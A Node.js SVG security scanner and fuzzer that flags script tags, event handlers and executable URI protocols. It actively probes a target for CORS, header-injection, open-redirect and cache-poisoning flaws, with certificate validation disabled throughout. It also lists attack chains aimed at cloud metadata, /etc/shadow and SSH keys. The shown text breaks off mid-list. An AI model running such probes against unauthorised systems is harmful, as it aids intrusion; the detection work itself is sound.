#!/usr/bin/env node
/**
 * sl0ppy-svg-intel-scan ULTIMATE + Deep Fuzzer + Extended Protocols
 * Passive/Active SVG Security Intelligence Scanner
 * Fixed: Syntax error in regular expression
 */

const readline = require('readline');
const { JSDOM } = require('jsdom');
const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
const https = require('https');
const { Agent } = require('https');

// Create custom HTTPS agent that ignores certificate errors
const customAgent = new Agent({
  rejectUnauthorized: false // Bypass certificate validation for testing
});

// ---------------- UI ----------------
const C = {
  R: '\x1b[31m', G: '\x1b[32m', Y: '\x1b[33m',
  B: '\x1b[34m', M: '\x1b[35m', C: '\x1b[36m',
  X: '\x1b[0m', BOLD: '\x1b[1m'
};

const log = {
  h: t => console.log(`\n${C.M}${C.BOLD}▌ ${t}${C.X}`),
  i: t => console.log(`${C.C}[*]${C.X} ${t}`),
  ok: t => console.log(`${C.G}[OK]${C.X} ${t}`),
  w: t => console.log(`${C.Y}[!]${C.X} ${t}`),
  v: t => console.log(`${C.R}[VULN]${C.X} ${t}`),
  f: t => console.log(`${C.B}[FUZZ]${C.X} ${t}`),
  s: t => console.log(`${C.G}[SUCCESS]${C.X} ${t}`),
  e: t => console.log(`${C.M}${C.BOLD}[EASTER EGG]${C.X} ${t}`),
};

// ---------------- ORGANIZATION DOMAINS FOR EASTER EGGS ----------------
const ORG_DOMAINS = {
  'divd.nl': 'DIVD',
  'ncsc.nl': 'NCSC',
  'jscu.nl': 'JSCU',
  'dcc.nl': 'DCC',
  'kpn.com': 'KPN',
  'soc.nl': 'SOC',
};

// ---------------- CHECK FOR EASTER EGGS ----------------
function checkEasterEggs(url) {
  for (const [domain, org] of Object.entries(ORG_DOMAINS)) {
    if (url.includes(domain)) {
      log.e(`The ghost says hi to ${org}! 👻`);
      return true;
    }
  }
  return false;
}

// ---------------- EXTENDED EXECUTION PROTOCOLS ----------------
const EXEC_PROTOCOLS = [
  // Standard JavaScript protocols
  'javascript:', 'jscript:', 'vbscript:', 'data:text/javascript',
  'data:application/javascript', 'data:application/x-javascript',
  'data:text/html', 'data:image/svg+xml', 'data:text/plain',

  // File and system protocols
  'file:', 'filesystem:', 'resource:', 'about:', 'chrome:',
  'moz-icon:', 'view-source:', 'wyciwyg:', 'cid:', 'mid:',
  'ms-help:', 'ms-its:', 'ms-screenclip:', 'mhtml:', 'search-ms:',
  'shell:', 'skype:', 'spotify:', 'steam:', 'tel:', 'mailto:',
  'sms:', 'callto:', 'facetime:', 'feed:', 'find:', 'itms:',
  'itms-apps:', 'itms-appss:', 'itms-bookss:', 'itms-podcasts:',
  'magnet:', 'maps:', 'market:', 'message:', 'mms:', 'news:',
  'nntp:', 'officeaddin:', 'onenote:', 'onenote-cmd:', 'sip:',
  'sips:', 'slack:', 'snews:', 'ssh:', 'teamspeak:', 'thunder:',
  'tv:', 'ventrilo:', 'webcal:', 'wtai:', 'xmpp:', 'ymsgr:',
  'zalo:', 'zoommtg:', 'zoomus:',

  // Network protocols
  'http:', 'https:', 'ftp:', 'sftp:', 'ftps:', 'ws:', 'wss:',
  'gopher:', 'dict:', 'ldap:', 'ldaps:', 'imap:', 'imaps:',
  'pop:', 'pop3:', 'pop3s:', 'smtp:', 'smtps:', 'nntp:', 'nntps:',
  'news:', 'telnet:', 'tn3270:', 'irc:', 'ircs:', 'git:', 'svn:',
  'svn+ssh:', 'rsync:', 'afp:', 'nfs:', 'smb:', 'cifs:', 'tftp:',
  'bittorrent:', 'dns:', 'ipn:', 'ipns:', 'ipfs:', 'dat:',
  'dweb:', 'hyper:', 'ssb:', 'ssb:', 'ws:', 'wss:',

  // Special protocols for exploitation
  'php://filter/', 'php://input', 'php://output', 'php://temp',
  'php://memory', 'php://stdin', 'php://stdout', 'php://stderr',
  'expect://', 'data:text/html;base64,', 'jar:', 'verbatim:',
  'javascript:alert(', 'javascript:confirm(', 'javascript:prompt(',
  'data:text/html,<script>', 'data:text/html,<svg/onload=',

  // Browser-specific protocols
  'chrome-extension:', 'moz-extension:', 'safari-extension:',
  'ms-browser-extension:', 'edge:', 'chrome:', 'about:config',
  'about:debugging', 'about:addons', 'about:preferences',
  'about:config', 'about:blank', 'about:cache', 'about:crashes',
  'about:memory', 'about:networking', 'about:performance',
  'about:processes', 'about:serviceworkers', 'about:support',
  'about:webrtc', 'view-source:http://', 'resource://',

  // Mobile app protocols
  'intent:', 'itms-apps:', 'itms-bookss:', 'itms-podcasts:',
  'fb:', 'fb-messenger:', 'twitter:', 'instagram:', 'whatsapp:',
  'snapchat:', 'tiktok:', 'linkedin:', 'pinterest:', 'reddit:',
  'youtube:', 'twitch:', 'discord:', 'slack:', 'telegram:',
  'signal:', 'viber:', 'line:', 'kakaotalk:', 'wechat:',
  'alipay:', 'weixin:', 'taobao:', 'jd:', 'meituan:',
  'didi:', 'baidu:', 'sogou:', '360:', 'qq:'
];

// ---------------- EXTENDED EVENT HANDLERS ----------------
const EVENT_RX = new RegExp(
  '^(onabort|onafterprint|onafterscriptexecute|onanimationcancel|onanimationend|' +
  'onanimationiteration|onanimationstart|onauxclick|onbeforecopy|onbeforecut|' +
  'onbeforematch|onbeforepaste|onbeforeprint|onbeforeunload|onbegin|onblur|' +
  'oncancel|oncanplay|oncanplaythrough|onchange|onclick|onclose|oncontextlost|' +
  'oncontextmenu|oncontextrestored|oncopy|oncuechange|oncut|ondblclick|ondrag|' +
  'ondragend|ondragenter|ondragexit|ondragleave|ondragover|ondragstart|ondrop|' +
  'ondurationchange|onemptied|onended|onerror|onfocus|onfocusin|onfocusout|' +
  'onformdata|onhashchange|oninput|oninvalid|onkeydown|onkeypress|onkeyup|' +
  'onlanguagechange|onload|onloadeddata|onloadedmetadata|onloadstart|onmessage|' +
  'onmessageerror|onmousedown|onmouseenter|onmouseleave|onmousemove|onmouseout|' +
  'onmouseover|onmouseup|onmousewheel|onoffline|ononline|onpagehide|onpageshow|' +
  'onpaste|onpause|onplay|onplaying|onpopstate|onprogress|onratechange|' +
  'onrejectionhandled|onreset|onresize|onscroll|onscrollend|onsecuritypolicyviolation|' +
  'onseeked|onseeking|onselect|onslotchange|onstalled|onstorage|onsubmit|' +
  'onsuspend|ontimeupdate|ontoggle|onunhandledrejection|onunload|onvolumechange|' +
  'onwaiting|onwebkitspeechchange|onwheel|onanimationcancel|onanimationend|' +
  'onanimationiteration|onanimationstart|ontransitioncancel|ontransitionend|' +
  'ontransitionrun|ontransitionstart|onpointerlockchange|onpointerlockerror|' +
  'onbeforexrselect|onend|onrepeat|onstart|onsuspend|onactivate|onbeforeactivate|' +
  'onbeforedeactivate|oncellchange|oncontrolselect|ondeactivate|ondatasetchanged|' +
  'ondataavailable|ondatasetcomplete|onfilterchange|onhelp|onlosecapture|' +
  'onpropertychange|onreadystatechange|onresizeend|onresizestart|onrowenter|' +
  'onrowexit|onrowsdelete|onrowsinserted|onscroll|onselectstart|onselectionchange|' +
  'onstop|ontimeerror|onbounce|onfinish|onstart|onreverse|onrepeat|onbegin|' +
  'onend|onmark|onpause|onresume|onseek|onseeked|onseeking|onstalled|onwaiting|' +
  'onabort|onbeforecopy|onbeforecut|onbeforepaste|onbeforeprint|onbeforeunload|' +
  'onblur|onchange|onclick|oncontextmenu|oncopy|oncut|ondblclick|ondrag|ondragend|' +
  'ondragenter|ondragleave|ondragover|ondragstart|ondrop|ondurationchange|onemptied|' +
  'onended|onerror|onfocus|oninput|oninvalid|onkeydown|onkeypress|onkeyup|onload|' +
  'onloadeddata|onloadedmetadata|onloadstart|onmousedown|onmouseenter|onmouseleave|' +
  'onmousemove|onmouseout|onmouseover|onmouseup|onmousewheel|onpaste|onpause|' +
  'onplay|onplaying|onprogress|onratechange|onreset|onresize|onscroll|onseeked|' +
  'onseeking|onselect|onshow|onstalled|onsubmit|onsuspend|ontimeupdate|ontoggle|' +
  'onunhandledrejection|onunload|onvolumechange|onwaiting|onwebkitspeechchange|' +
  'onwheel)$', 'i'
);

// ---------------- EXTENDED SURFACES ----------------
const EXEC_TAGS = new Set([
  'script', 'foreignobject', 'iframe', 'embed', 'object', 'animate', 'animatetransform',
  'animatemotion', 'set', 'image', 'audio', 'video', 'mpath', 'use', 'handler', 'metadata',
  'feImage', 'feDistantLight', 'feFuncA', 'feFuncR', 'feFuncG', 'feFuncB', 'feTurbulence',
  'feDisplacementMap', 'a', 'style', 'title', 'desc', 'text', 'tspan', 'tref', 'textPath',
  'altGlyph', 'glyphRef', 'textArea', 'switch', 'view', 'cursor', 'font', 'font-face',
  'glyph', 'missing-glyph', 'hkern', 'vkern', 'path', 'rect', 'circle', 'ellipse', 'line',
  'polyline', 'polygon', 'defs', 'g', 'symbol', 'mask', 'clipPath', 'pattern', 'linearGradient',
  'radialGradient', 'stop', 'filter', 'feBlend', 'feColorMatrix', 'feComponentTransfer',
  'feComposite', 'feConvolveMatrix', 'feDiffuseLighting', 'feFlood', 'feGaussianBlur',
  'feMerge', 'feMergeNode', 'feMorphology', 'feOffset', 'fePointLight', 'feSpecularLighting',
  'feSpotLight', 'feTile', 'mark', 'marker', 'pattern', 'solidcolor', 'stop', 'svg', 'switch',
  'text', 'textPath', 'tref', 'tspan', 'use', 'view', 'vkern', 'missing-glyph', 'altGlyphDef',
  'altGlyphItem', 'glyphRef', 'color-profile', 'cursor', 'filter', 'font', 'font-face',
  'font-face-format', 'font-face-name', 'font-face-src', 'font-face-uri', 'foreignObject',
  'hatch', 'hatchpath', 'image', 'line', 'linearGradient', 'mesh', 'meshgradient', 'meshpatch',
  'meshrow', 'metadata', 'mpath', 'path', 'polygon', 'polyline', 'radialGradient', 'rect',
  'script', 'set', 'solidcolor', 'stop', 'style', 'svg', 'symbol', 'text', 'textPath', 'title',
  'use', 'view', 'circle', 'ellipse', 'line', 'mesh', 'meshgradient', 'meshpatch', 'meshrow',
  'polygon', 'polyline', 'rect', 'text', 'textPath', 'tref', 'tspan', 'unknown'
]);

const URI_ATTRS = [
  'href', 'xlink:href', 'src', 'data', 'action', 'formaction', 'poster', 'background',
  'cite', 'profile', 'codebase', 'archive', 'longdesc', 'usemap', 'icon', 'manifest',
  'form', 'dynsrc', 'lowsrc', 'cite', 'classid', 'data-src', 'data-fetch', 'data-href',
  'data-xlink:href', 'data-action', 'data-background', 'data-cite', 'data-profile',
  'data-codebase', 'data-archive', 'data-longdesc', 'data-usemap', 'data-icon', 'data-manifest',
  'data-form', 'data-dynsrc', 'data-lowsrc', 'data-classid', 'data-srcset', 'data-data',
  'data-poster', 'data-formaction', 'data-action', 'data-background-image', 'data-url',
  'data-about', 'data-resource', 'data-archive', 'data-object', 'data-pluginurl', 'data-pluginspage',
  'data-code', 'data-plugin', 'data-app', 'data-manifest', 'data-config', 'data-profile',
  'data-cite', 'data-icon', 'data-srcdoc', 'data-embed', 'data-object', 'data-param',
  'data-embed-src', 'data-frame-src', 'data-media', 'data-plugin-url', 'data-plugin-page',
  'data-codebase', 'data-classid', 'data-data', 'data-archive', 'data-embed', 'data-object',
  'data-plugin', 'data-src', 'data-href', 'data-xlink:href', 'data-action', 'data-background',
  'data-cite', 'data-profile', 'data-codebase', 'data-archive', 'data-longdesc', 'data-usemap',
  'data-icon', 'data-manifest', 'data-form', 'data-dynsrc', 'data-lowsrc', 'data-classid',
  'data-srcset', 'data-data', 'data-poster', 'data-formaction', 'data-action', 'data-background-image',
  'data-url', 'data-about', 'data-resource', 'data-archive', 'data-object', 'data-pluginurl',
  'data-pluginspage', 'data-code', 'data-plugin', 'data-app', 'data-manifest', 'data-config',
  'data-profile', 'data-cite', 'data-icon', 'data-srcdoc', 'data-embed', 'data-object',
  'data-param', 'data-embed-src', 'data-frame-src', 'data-media', 'data-plugin-url',
  'data-plugin-page', 'data-codebase', 'data-classid', 'data-data', 'data-archive',
  'data-embed', 'data-object', 'data-plugin', 'data-src', 'data-href', 'data-xlink:href'
];

// ---------------- NORMALIZATION ----------------
function normalize(str) {
  try {
    return decodeURIComponent(
      str.replace(/&#x([0-9a-f]+);?/gi, (_, h) => String.fromCharCode(parseInt(h, 16)))
        .replace(/&#(\d+);?/g, (_, d) => String.fromCharCode(d))
    ).toLowerCase();
  } catch {
    return str.toLowerCase();
  }
}

// ---------------- FUZZER WITH CERT BYPASS ----------------
async function fetchWithBypass(url, options = {}) {
  // Use custom agent that ignores certificate errors
  const agent = new https.Agent({
    rejectUnauthorized: false
  });

  // Merge custom agent with existing options
  const fetchOptions = {
    ...options,
    agent
  };

  const fetchModule = await import('node-fetch');
  return fetchModule.default(url, fetchOptions);
}

// ---------------- FUZZER ----------------
async function fuzzSVG(target, payloads, type) {
  for (const payload of payloads) {
    try {
      log.f(`Testing ${type} payload: ${payload.substring(0, 50)}...`);
      const testURL = new URL(target);
      testURL.searchParams.set('test', encodeURIComponent(payload));

      const res = await fetchWithBypass(testURL.toString(), {
        method: 'GET',
        headers: { 'Content-Type': 'image/svg+xml' },
      });

      const body = await res.text();
      if (/root:x|Administrator|\[boot loader\]|ERROR:|php|Warning|Notice|Fatal error|Exception|Stack trace|uid=|gid=|groups=|sh:|command not found|No such file or directory/.test(body)) {
        log.v(`${type} vulnerability detected! Payload: ${payload.substring(0, 50)}...`);
        return true;
      }
    } catch (e) {
      log.w(`Error testing ${type}: ${e.message}`);
    }
  }
  return false;
}

// ---------------- DELIVERY PIPELINE FUZZER WITH PROPER HEADER VALIDATION ----------------
async function fuzzDeliveryPipeline(target) {
  let vulnerabilities = {
    cors: false,
    missingHeaders: [],
    headerInjection: false,
    hostHeaderInjection: false,
    originHeaderIssues: false,
    refererHeaderIssues: false,
    userAgentIssues: false,
    openRedirect: false,
    cachePoisoning: false,
  };

  const targetUrl = new URL(target);
  const baseDomain = targetUrl.hostname;

  // Test CORS misconfiguration
  try {
    const corsTestURL = new URL(target);
    const res = await fetchWithBypass(corsTestURL.toString(), {
      method: 'OPTIONS',
      headers: { 'Origin': 'http://test.example.com' },
    });

    const corsHeader = res.headers.get('access-control-allow-origin');
    if (corsHeader && (corsHeader.includes('*') || corsHeader.includes('test.example.com'))) {
      log.v('Misconfigured CORS detected: Allows any origin or test.example.com');
      vulnerabilities.cors = true;
    }
  } catch (e) {
    log.w(`CORS test failed: ${e.message}`);
  }

  // Test missing security headers
  try {
    const res = await fetchWithBypass(target);
    const SECURITY_HEADERS = [
      'content-security-policy', 'x-content-type-options', 'x-frame-options',
      'x-xss-protection', 'strict-transport-security', 'referrer-policy',
      'feature-policy', 'permissions-policy', 'expect-ct',
      'cross-origin-opener-policy', 'cross-origin-resource-policy',
      'cross-origin-embedder-policy', 'content-security-policy-report-only',
    ];

    SECURITY_HEADERS.forEach(header => {
      if (!res.headers.get(header.toLowerCase())) {
        if (!vulnerabilities.missingHeaders.includes(header)) {
          vulnerabilities.missingHeaders.push(header);
        }
      }
    });

    if (vulnerabilities.missingHeaders.length > 0) {
      log.v(`Missing security headers: ${vulnerabilities.missingHeaders.join(', ')}`);
    }
  } catch (e) {
    log.w(`Missing headers test failed: ${e.message}`);
  }

  // Test HTTP header injection with valid characters
  try {
    const headerInjectionURL = new URL(target);
    // Using a simple valid header value for testing
    const testHeaderValue = 'test-value';
    const testHeaderName = 'X-Test-Header';

    const res = await fetchWithBypass(headerInjectionURL.toString(), {
      headers: { [testHeaderName]: testHeaderValue },
    });

    // Check if the header is reflected in the response
    const headerReflected = res.headers.get(testHeaderName.toLowerCase()) === testHeaderValue ||
                          (await res.text()).includes(testHeaderValue);

    if (headerReflected) {
      log.v('HTTP Header Injection vulnerability detected (header reflection)');
      vulnerabilities.headerInjection = true;
    }
  } catch (e) {
    log.w(`Header injection test failed: ${e.message}`);
  }

  // Test Host header injection with valid domain
  try {
    const hostHeaderURL = new URL(target);
    const testHost = 'test.example.com';
    const res = await fetchWithBypass(hostHeaderURL.toString(), {
      headers: { 'Host': testHost },
    });

    const body = await res.text();
    if (body.includes(testHost) || res.headers.get('location')?.includes(testHost)) {
      log.v('Host Header Injection vulnerability detected');
      vulnerabilities.hostHeaderInjection = true;
    }
  } catch (e) {
    log.w(`Host header injection test failed: ${e.message}`);
  }

  // Test Origin header issues with valid domain
  try {
    const originHeaderURL = new URL(target);
    const testOrigin = 'http://test.example.com';
    const res = await fetchWithBypass(originHeaderURL.toString(), {
      headers: { 'Origin': testOrigin },
    });

    const acaoHeader = res.headers.get('access-control-allow-origin');
    if (acaoHeader && acaoHeader.includes(testOrigin)) {
      log.v('Origin Header Reflection vulnerability detected');
      vulnerabilities.originHeaderIssues = true;
    }
  } catch (e) {
    log.w(`Origin header test failed: ${e.message}`);
  }

  // Test Referer header issues with valid URL
  try {
    const refererHeaderURL = new URL(target);
    const testReferer = 'http://test.example.com/valid';
    const res = await fetchWithBypass(refererHeaderURL.toString(), {
      headers: { 'Referer': testReferer },
    });

    const body = await res.text();
    if (body.includes(testReferer)) {
      log.v('Referer Header Reflection vulnerability detected');
      vulnerabilities.refererHeaderIssues = true;
    }
  } catch (e) {
    log.w(`Referer header test failed: ${e.message}`);
  }

  // Test User-Agent issues with valid user agent
  try {
    const userAgentURL = new URL(target);
    const testUserAgent = 'Mozilla/5.0 (compatible; TestBot/1.0)';
    const res = await fetchWithBypass(userAgentURL.toString(), {
      headers: { 'User-Agent': testUserAgent },
    });

    const body = await res.text();
    if (body.includes(testUserAgent)) {
      log.v('User-Agent Header Reflection vulnerability detected');
      vulnerabilities.userAgentIssues = true;
    }
  } catch (e) {
    log.w(`User-Agent test failed: ${e.message}`);
  }

  // Test open redirect
  try {
    const openRedirectURL = new URL(target);
    openRedirectURL.pathname = '/redirect';
    openRedirectURL.searchParams.set('url', 'http://test.example.com');

    const res = await fetchWithBypass(openRedirectURL.toString(), {
      redirect: 'manual'
    });

    if (res.status === 301 || res.status === 302) {
      const location = res.headers.get('location');
      if (location && location.includes('test.example.com')) {
        log.v('Open Redirect vulnerability detected');
        vulnerabilities.openRedirect = true;
      }
    }
  } catch (e) {
    log.w(`Open redirect test failed: ${e.message}`);
  }

  // Test cache poisoning
  try {
    const cachePoisoningURL = new URL(target);
    cachePoisoningURL.searchParams.set('cb', Date.now());

    const testHost = 'test.example.com';
    const res = await fetchWithBypass(cachePoisoningURL.toString(), {
      headers: { 'X-Forwarded-Host': testHost },
    });

    const body = await res.text();
    if (body.includes(testHost)) {
      log.v('Cache Poisoning vulnerability detected');
      vulnerabilities.cachePoisoning = true;
    }
  } catch (e) {
    log.w(`Cache poisoning test failed: ${e.message}`);
  }

  return vulnerabilities;
}

// ---------------- THEORETICAL CHAIN TESTER ----------------
function testTheoreticalChains(detectedVulnerabilities) {
  const possibleChains = [];

  // XXE Chains
  if (detectedVulnerabilities.xxe) {
    possibleChains.push('SVG XXE → LFI (file:///)');
    possibleChains.push('SVG XXE → SSRF (http://169.254.169.254/)');
    possibleChains.push('SVG XXE → RCE (via PHP filter wrappers)');
    possibleChains.push('SVG XXE → Blind XXE (OOB data exfiltration)');
    possibleChains.push('SVG XXE → Cloud metadata access (AWS/GCP/Azure)');
    possibleChains.push('SVG XXE → Internal file disclosure (/etc/passwd, /etc/shadow)');
    possibleChains.push('SVG XXE → Environment variable leakage (/proc/self/environ)');
  }

  // SSRF Chains
  if (detectedVulnerabilities.ssrf) {
    possibleChains.push('SVG SSRF → Cloud metadata access (AWS/GCP/Azure)');
    possibleChains.push('SVG SSRF → Internal network access');
    possibleChains.push('SVG SSRF → Port scanning (via error messages)');
    possibleChains.push('SVG SSRF → RCE (via internal services)');
    possibleChains.push('SVG SSRF → Database access (via SSRF to Redis/MySQL)');
    possibleChains.push('SVG SSRF → Internal service enumeration (http://localhost:22)');
    possibleChains.push('SVG SSRF → AWS IMDSv1 exploitation (http://169.254.169.254/)');
  }

  // LFI Chains
  if (detectedVulnerabilities.lfi) {
    possibleChains.push('SVG LFI → Sensitive file leakage (/etc/passwd, /etc/shadow)');
    possibleChains.push('SVG LFI → Source code disclosure');
    possibleChains.push('SVG LFI → Log poisoning → RCE');
    possibleChains.push('SVG LFI → Configuration file access (/etc/nginx/nginx.conf)');
    possibleChains.push('SVG LFI → Environment variable leakage (/proc/self/environ)');
    possibleChains.push('SVG LFI → Database credentials (/etc/mysql/my.cnf)');
    possibleChains.push('SVG LFI → SSH keys (~/.ssh/id_rsa)');
  }

  // XSS Chains
  if (detectedVulnerabilities.xss) {
    possibleChains.push('SVG XSS → DOM clobbering → UI redressing');
    possibleChains.push('SVG XSS → CSP bypass → Full page control');
    possibleChains.push('SVG XSS → WebSocket hijacking → Real-time data exfiltration');
    possibleChains.push('SVG XSS → Service Worker registration → Persistent attack');
    possibleChains.push('SVG XSS → IndexedDB manipulation → Client-side data theft');
    possibleChains.push('SVG XSS → WebRTC leakage → Internal network mapping');
    possibleChains.push('SVG XSS → Credential Manager API → Saved password theft');
    possibleChains.push('SVG XSS → Payment Request API → Financial fraud');
    possibleChains.push('SVG XSS → Clipboard API → Clipboard hijacking');
    possibleChains.push('SVG XSS → Geolocation API → Physical location tracking');
    possibleChains.push('SVG XSS → DeviceMotion/DeviceOrientation → Sensor data theft');
    possibleChains.push('SVG XSS → Web Bluetooth API → Device pairing hijacking');
    possibleChains.push('SVG XSS → Cookie manipulation → Session hijacking');
    possibleChains.push('SVG XSS → LocalStorage/SessionStorage access → Data exfiltration');
    possibleChains.push('SVG XSS → WebSocket → C2 channel establishment');
  }

  // RCE Chains
  if (detectedVulnerabilities.rce) {
    possibleChains.push('SVG RCE → Command execution (via XXE expect://)');
    possibleChains.push('SVG RCE → Arbitrary file read (via LFI)');
    possibleChains.push('SVG RCE → Reverse shell (via XSS + WebSocket)');
    possibleChains.push('SVG RCE → Persistent backdoor (via Service Worker)');
    possibleChains.push('SVG RCE → Data exfiltration (via WebSocket)');
    possibleChains.push('SVG RCE → File system manipulation (via Node.js fs module)');
    possibleChains.push('SVG RCE → Process spawn (via child_process)');
    possibleChains.push('SVG RCE → Network scanning (via internal SSRF)');
    possibleChains.push('SVG RCE → Privilege escalation (via misconfigured services)');
    possibleChains.push('SVG RCE → Lateral movement (via internal network access)');
  }

  // Delivery Pipeline Chains
  if (detectedVulnerabilities.deliveryPipeline) {
    if (detectedVulnerabilities.deliveryPipeline.cors) {
      possibleChains.push('Misconfigured CORS → Cross-origin data theft');
      possibleChains.push('Misconfigured CORS → CSRF attacks');
      possibleChains.push('Misconfigured CORS → API abuse');
    }
    if (detectedVulnerabilities.deliveryPipeline.missingHeaders.length > 0) {
      possibleChains.push('Missing Security Headers → XSS, Clickjacking, MIME sniffing');
      possibleChains.push('Missing Security Headers → Data exfiltration');
      possibleChains.push('Missing Security Headers → Cache poisoning');
    }
    if (detectedVulnerabilities.deliveryPipeline.headerInjection) {
      possibleChains.push('HTTP Header Injection → Cache poisoning, XSS');
      possibleChains.push('HTTP Header Injection → Request smuggling');
      possibleChains.push('HTTP Header Injection → Response splitting');
    }
    if (detectedVulnerabilities.deliveryPipeline.hostHeaderInjection) {
      possibleChains.push('Host Header Injection → Virtual host bypass');
      possibleChains.push('Host Header Injection → Cache poisoning');
      possibleChains.push('Host Header Injection → Password reset poisoning');
    }
    if (detectedVulnerabilities.deliveryPipeline.originHeaderIssues) {
      possibleChains.push('Origin Header Reflection → CORS bypass');
      possibleChains.push('Origin Header Reflection → CSRF');
    }
    if (detectedVulnerabilities.deliveryPipeline.refererHeaderIssues) {
      possibleChains.push('Referer Header Reflection → Open redirect');
      possibleChains.push('Referer Header Reflection → CSRF');
    }
    if (detectedVulnerabilities.deliveryPipeline.userAgentIssues) {
      possibleChains.push('User-Agent Header Injection → XSS');
      possibleChains.push('User-Agent Header Injection → SQLi (in logs)');
    }
    if (detectedVulnerabilities.deliveryPipeline.openRedirect) {
      possibleChains.push('Open Redirect → Phishing, Credential theft');
      possibleChains.push('Open Redirect → Malware distribution');
      possibleChains.push('Open Redirect → SEO poisoning');
    }
    if (detectedVulnerabilities.deliveryPipeline.cachePoisoning) {
      possibleChains.push('Cache Poisoning → Stored XSS');
      possibleChains.push('Cache Poisoning → Defacement');
      possibleChains.push('Cache Poisoning → Credential theft');
    }
  }

  return possibleChains;
}

// ---------------- MAIN ----------------
const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
rl.question(`${C.B}Target SVG URL:${C.X} `, async target => {
  rl.close();

  // Check for Easter Eggs
  checkEasterEggs(target);

  if (!/^https?:\/\//i.test(target)) {
    log.w('Invalid URL');
    process.exit(1);
  }

  log.i(`Fetching ${target}`);
  try {
    const res = await fetchWithBypass(target);
    const headers = Object.fromEntries(res.headers.entries());
    const body = await res.text();

    if (!body.toLowerCase().includes('<svg')) {
      log.ok('Not an SVG');
      return;
    }

    let score = 0;
    let signals = 0;
    const detectedVulnerabilities = {
      xxe: false,
      ssrf: false,
      lfi: false,
      xss: false,
      rce: false,
      deliveryPipeline: {},
    };

    // ==================================================
    // CLIENT SIDE – DOM EXECUTION SURFACE
    // ==================================================
    log.h('CLIENT‑SIDE – SVG EXECUTION SURFACE');

    const dom = new JSDOM(body);
    const doc = dom.window.document;

    // --- Check for <script> tags ---
    const scripts = doc.querySelectorAll('script');
    if (scripts.length > 0) {
      log.v(`Found ${scripts.length} <script> tag(s)`);
      score += 3;
      signals++;
      detectedVulnerabilities.xss = true;
    }

    // --- Check for inline event handlers ---
    for (const el of [...doc.querySelectorAll('*')]) {
      const tag = el.tagName.toLowerCase();
      if (EXEC_TAGS.has(tag)) {
        log.v(`Executable SVG tag <${tag}>`);
        score += 2;
        signals++;
        detectedVulnerabilities.xss = true;
      }

      for (const attr of el.getAttributeNames()) {
        const val = normalize(el.getAttribute(attr) || '');

        if (EVENT_RX.test(attr)) {
          log.v(`Event attribute "${attr}"`);
          score += 2;
          signals++;
          detectedVulnerabilities.xss = true;
        }

        if (URI_ATTRS.includes(attr.toLowerCase())) {
          if (EXEC_PROTOCOLS.some(p => val.startsWith(p))) {
            log.v(`Executable URI in ${attr}`);
            score += 3;
            signals++;
            detectedVulnerabilities.xss = true;
          }
        }

        if (attr === 'style' && /url\(|@import|expression/i.test(val)) {
          log.v('CSS execution vector');
          score += 2;
          signals++;
          detectedVulnerabilities.xss = true;
        }
      }
    }

    // --- Check for external resource loading ---
    const externalResources = doc.querySelectorAll('[src], [href]');
    if (externalResources.length > 0) {
      log.v(`Found ${externalResources.length} external resource(s)`);
      score += 1;
    }

    // --- Check for dynamic imports ---
    if (/import\(/i.test(body)) {
      log.v('Dynamic import detected');
      score += 2;
      detectedVulnerabilities.xss = true;
    }

    // --- Check for WebSocket usage ---
    if (/WebSocket\(/i.test(body)) {
      log.v('WebSocket usage detected');
      score += 2;
      detectedVulnerabilities.xss = true;
    }

    // --- Check for fetch/XHR usage ---
    if (/fetch\(/i.test(body) || /XMLHttpRequest/i.test(body)) {
      log.v('Fetch/XHR usage detected');
      score += 2;
      detectedVulnerabilities.xss = true;
    }

    // --- Check for Node.js specific patterns ---
    if (/require\(/i.test(body) || /process\./i.test(body) || /child_process/i.test(body) ||
        /fs\./i.test(body) || /__dirname/i.test(body) || /__filename/i.test(body)) {
      log.v('Node.js specific patterns detected');
      score += 3;
      detectedVulnerabilities.rce = true;
    }

    if (!signals) log.ok('No direct DOM execution primitives found');

    // ==================================================
    // RAW & OBFUSCATION HEURISTICS
    // ==================================================
    log.h('CLIENT‑SIDE – OBFUSCATION & BYPASS HEURISTICS');

    const RAW_PATTERNS = [
      [/xmlns:xlink/i, 'xlink namespace'],
      [/xmlns:[a-z0-9]+=/i, 'custom namespace'],
      [/<!\[cdata\[/i, 'CDATA obfuscation'],
      [/%3c|%3e|%22/i, 'URL encoded markup'],
      [/&#x|&#\d+/i, 'HTML entity encoding'],
      [/base64,/i, 'Base64 embedded payload'],
      [/<use[^>]+href=/i, '<use> reference chaining'],
      [/<style[\s>]/i, 'Embedded CSS block'],
      [/eval\(/i, 'JavaScript eval()'],
      [/document\.write\(/i, 'document.write()'],
      [/innerHTML/i, 'innerHTML assignment'],
      [/setTimeout\(/i, 'setTimeout()'],
      [/setInterval\(/i, 'setInterval()'],
      [/Function\(/i, 'Function constructor'],
      [/new Function\(/i, 'new Function()'],
      [/import\(/i, 'Dynamic import()'],
      [/fetch\(/i, 'Fetch API'],
      [/XMLHttpRequest/i, 'XHR object'],
      [/atob\(/i, 'Base64 decoding'],
      [/btoa\(/i, 'Base64 encoding'],
      [/escape\(/i, 'Escape function'],
      [/unescape\(/i, 'Unescape function'],
      [/decodeURIComponent\(/i, 'URI decoding'],
      [/encodeURIComponent\(/i, 'URI encoding'],
      [/WebSocket\(/i, 'WebSocket connection'],
      [/localStorage/i, 'LocalStorage access'],
      [/sessionStorage/i, 'SessionStorage access'],
      [/cookie/i, 'Cookie manipulation'],
      [/window\./i, 'Window object access'],
      [/location\./i, 'Location object access'],
      [/history\./i, 'History object access'],
      [/navigator\./i, 'Navigator object access'],
      [/console\.log\(/i, 'Console logging'],
      [/debugger/i, 'Debugger statement'],
      [/alert\(/i, 'Alert dialog'],
      [/confirm\(/i, 'Confirm dialog'],
      [/prompt\(/i, 'Prompt dialog'],
      [/open\(/i, 'Window open'],
      [/opener/i, 'Window opener'],
      [/parent\./i, 'Parent window access'],
      [/top\./i, 'Top window access'],
      [/self\./i, 'Self window access'],
      [/frames\[/i, 'Frames access'],
      [/postMessage\(/i, 'postMessage API'],
      [/addEventListener\(/i, 'Event listener'],
      [/removeEventListener\(/i, 'Event listener removal'],
      [/dispatchEvent\(/i, 'Event dispatch'],
      [/customElements\./i, 'Custom elements'],
      [/shadowRoot/i, 'Shadow DOM'],
      [/importNode\(/i, 'Node import'],
      [/cloneNode\(/i, 'Node cloning'],
      [/appendChild\(/i, 'Node appending'],
      [/removeChild\(/i, 'Node removal'],
      [/replaceChild\(/i, 'Node replacement'],
